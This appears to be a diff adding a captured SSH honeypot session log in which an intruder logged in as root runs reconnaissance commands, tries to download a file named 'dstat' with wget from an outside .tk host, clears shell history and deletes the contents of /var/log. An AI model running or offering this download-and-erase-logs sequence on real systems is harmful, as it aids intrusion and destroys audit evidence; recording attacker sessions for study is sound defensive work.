@@ -1,0 +1,95 @@
+[4hAWSWeb:~# uptime
+[4l 23:57:41 up 109 days, 2:1,  1 users, load averages: 0.09 0.05 0.05
+[4hAWSWeb:~# who
+[4l 23:57:42 up 109 days, 2:1,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    87.10.158.7       23:57    0.09   0.05   0.05 w
+[4hAWSWeb:~# history
+[4l    1  uptime
+    2  who
+    3  history
+[4hAWSWeb:~# lastlog
+bash: lastlog: command not found
+AWSWeb:~# uname -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:~# cd [1D[1P[1D[1P[1D[1Pls
+[4l[4hAWSWeb:~# pwd
+[4l/root
+[4hAWSWeb:~# ls -la
+[4ldrwxr-xr-x 1 root root 4096 2013-05-13 23:58 .
+drwxr-xr-x 1 root root 4096 2013-05-13 23:58 ..
+drwxr-xr-x 1 root root 4096 2009-11-06 11:16 .debtags
+-rw------- 1 root root 5515 2009-11-20 09:08 .viminfo
+drwx------ 1 root root 4096 2009-11-06 11:13 .aptitude
+-rw-r--r-- 1 root root  140 2009-11-06 11:09 .profile
+-rw-r--r-- 1 root root  412 2009-11-06 11:09 .bashrc
+[4hAWSWeb:~# cd /
+[4l[4hAWSWeb:/# ls
+[4lsys        bin        mnt        media      vmlinuz    opt        cdrom      
+selinux    tmp        proc       sbin       etc        dev        srv        
+initrd.img lib        home       var        usr        boot       root       
+lost+found 
+[4hAWSWeb:/# wget
+[4lwget: missing URL
+Usage: wget [OPTION]... [URL]...
+
+Try `wget --help' for more options.
+[4hAWSWeb:/# netstat
+bash: netstat: command not found
+AWSWeb:/# cd /root
+[4l[4hAWSWeb:~# wget http://www.cicir0x.tk/dstat
+[4l--2013-05-13 23:58:24--  http://www.cicir0x.tk/dstat
+Connecting to www.cicir0x.tk:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'www.cicir0x.tk' not found: [Errno -2] Name or service not known.
+[4hAWSWeb:~# chmod
+[4l[4hAWSWeb:~# [Kchmod ..[1D[1P[1D[1P--help
+[4l[4hAWSWeb:~# ps
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps 
+[4hAWSWeb:~# pwd
+[4l/root
+[4hAWSWeb:~# history -c
+[4l[4hAWSWeb:~# cd /v[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P
+vmlinuz var     
+AWSWeb:~# cd /vlo[1D[1P[1D[1Par[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcd /var/lo[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P
+log   local lock  
+AWSWeb:~# cd /var/lo
+[4lbash: cd: /var/lo: No such file or directory
+[4hAWSWeb:~# ls
+[4l[4hAWSWeb:~# cd /v[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P
+vmlinuz var     
+AWSWeb:~# cd /var[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcd /var/log
+[4l[4hAWSWeb:/var/log# ls
+[4lkern.log.1   btmp         syslog       syslog.1     mail.info    lastlog      
+mail.err     news         dmesg        kern.log     daemon.log.1 fsck         
+messages     apt          auth.log     wtmp         messages.1   daemon.log   
+lpr.log      faillog      dmesg.1.gz   dpkg.log     debug        boot         
+dmesg.0      debug.1      user.log     mail.warn    mail.log     auth.log.1   
+[4hAWSWeb:/var/log# cat dmesg
+[4lcat: /var/log/dmesg: No such file or directory
+[4hAWSWeb:/var/log# rm *
+[4lrm: cannot remove `news': Is a directory
+rm: cannot remove `fsck': Is a directory
+rm: cannot remove `apt': Is a directory
+[4hAWSWeb:/var/log# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# ps
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps 
+[4hlocalhost:~# chmod
+[4l[4hlocalhost:~# history
+[4l    1  cd /var/lo
+    2  ls
+    3  cd /var/log
+    4  ls
+    5  cat dmesg
+    6  rm *
+    7  exit
+    8  ps
+    9  chmod
+   10  history
+[4hlocalhost:~# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# 
